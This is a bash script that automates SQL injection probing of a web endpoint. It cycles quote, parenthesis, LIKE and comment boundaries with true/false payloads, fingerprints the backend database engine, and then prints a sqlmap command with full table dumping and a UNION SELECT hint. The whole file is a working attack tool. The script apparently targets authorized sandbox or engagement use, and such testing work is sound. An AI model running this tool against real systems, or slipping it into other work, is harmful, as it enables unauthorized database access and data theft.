#!/usr/bin/env bash
# inject-probe — deterministic SQLi boundary + DBMS finder (NO AI, no third party).
#
# Does by rule what you otherwise do by hand: cycles the break-out boundary
# (quotes, parens, LIKE, numeric) and comment style, finds the one that gives a
# stable TRUE vs FALSE, then fires one engine-only probe per DBMS to fingerprint
# the backend. Pure local curl — safe to run in a tool-restricted engagement.
#
# You give: the request with __I__ where the injected value goes, a BASE value that
# normally returns results, and a MARKER string present in a true/normal response.
#
# Usage:
#   ./inject-probe.sh <url> '<data-with-__I__>' <base> '<true-marker>' [GET|POST]
#
# Example (POST, value 'taco' returns a row containing 'Tacos'):
#   ./inject-probe.sh http://sql-sandbox/sqlmap/api \
#       "db=mysql&name=__I__&sort=id&order=asc" taco Tacos POST
set -uo pipefail

URL="${1:?usage: inject-probe.sh <url> '<data __I__>' <base> '<marker>' [GET|POST]}"
TMPL="${2:?need data template containing __I__}"
BASE="${3:?need a base value that returns the marker}"
MARK="${4:?need a true-response marker}"
METHOD="${5:-POST}"
ERR_RE='error|exception|syntax|fatal|warning|ODBC|SQL|stack trace|500 Internal'

send(){ # $1=full injected value -> prints body
  local data="${TMPL/__I__/$1}"
  if [ "$METHOD" = GET ]; then
    local args=(); IFS='&' read -ra kv <<<"$data"; for p in "${kv[@]}"; do args+=(--data-urlencode "$p"); done
    curl -s --max-time 15 -G "$URL" "${args[@]}"
  else
    local args=(); IFS='&' read -ra kv <<<"$data"; for p in "${kv[@]}"; do args+=(--data-urlencode "$p"); done
    curl -s --max-time 15 "$URL" "${args[@]}"
  fi
}
has_mark(){ printf '%s' "$1" | grep -qF "$MARK"; }
is_err(){   printf '%s' "$1" | grep -qiE "$ERR_RE"; }

# boundary = "prefix|comment"  (prefix closes the context; comment swallows the tail)
# we also try a balanced re-open when no comment is given (comment field '=bal')
BOUNDS=(
  "| "                 # numeric, no comment (relies on nothing trailing / app-tolerant)
  "|-- -"              # numeric + comment
  "'|-- -"             # single quote + comment
  "'|#"                # single quote + hash
  "')|-- -"            # quote+paren + comment
  "')|#"
  "'))|-- -"           # quote + double paren
  "\"|-- -"            # double quote
  "\")|-- -"
  "%'|-- -"            # LIKE %  + comment
  "%')|-- -"           # LIKE % + paren  (classic LIKE ('%..%') )
  "%'))|-- -"
)

echo "[*] baseline check";
b=$(send "$BASE"); has_mark "$b" && echo "    base '$BASE' returns marker OK" || echo "    [!] base did NOT return marker — pick a BASE that returns a row"

FOUND=""
echo "[*] hunting boolean boundary (TRUE must show marker, FALSE must hide it, neither errors)"
for spec in "${BOUNDS[@]}"; do
  pre="${spec%%|*}"; cmt="${spec##*|}"
  t="${BASE}${pre} AND 1=1 ${cmt}"
  f="${BASE}${pre} AND 1=2 ${cmt}"
  rt=$(send "$t"); rf=$(send "$f")
  if ! is_err "$rt" && ! is_err "$rf" && has_mark "$rt" && ! has_mark "$rf"; then
    printf '    [HIT] prefix=%-5q comment=%-4q   TRUE=marker FALSE=empty\n' "$pre" "$cmt"
    FOUND="$spec"; break
  fi
done
[ -z "$FOUND" ] && { echo "    no AND-boolean boundary; retrying with OR (for strict/!= sinks)";
  for spec in "${BOUNDS[@]}"; do pre="${spec%%|*}"; cmt="${spec##*|}";
    t="${BASE}${pre} OR 1=1 ${cmt}"; f="${BASE}${pre} OR 1=2 ${cmt}";
    rt=$(send "$t"); rf=$(send "$f");
    if ! is_err "$rt" && ! is_err "$rf" && has_mark "$rt" && ! has_mark "$rf"; then
      printf '    [HIT-OR] prefix=%-5q comment=%-4q\n' "$pre" "$cmt"; FOUND="$spec"; break; fi
  done; }
[ -z "$FOUND" ] && { echo "[!] no stable boolean boundary found. Try a different BASE/marker, or it may be blind-only (time-based)."; exit 0; }

PRE="${FOUND%%|*}"; CMT="${FOUND##*|}"
echo "[*] confirmed boundary:  ${BASE}${PRE} <your logic> ${CMT}"
echo "[*] fingerprinting DBMS through that boundary (engine-only function must keep it TRUE)"
declare -A FN=(
  [MySQL]="sleep(0)=0"
  [PostgreSQL]="1=1::int"
  [MSSQL]="LEN(@@version)>0"
  [Oracle]="rownum>0"
  [SQLite]="sqlite_version()>''"
)
for eng in MySQL PostgreSQL MSSQL Oracle SQLite; do
  r=$(send "${BASE}${PRE} AND ${FN[$eng]} ${CMT}")
  if ! is_err "$r" && has_mark "$r"; then printf '    %-11s -> MATCH (engine-only fn succeeded)\n' "$eng";
  else printf '    %-11s -> no\n' "$eng"; fi
done
echo
echo "[*] next: sqlmap -u <url> --data '<data with your base value>' -p <param> \\"
echo "          --dbms=<matched> --level 3 --risk 3 --technique=BEU --threads 10 --batch --dump"
echo "    (or exploit by hand using the boundary above:  ${BASE}${PRE} UNION SELECT ... ${CMT})"
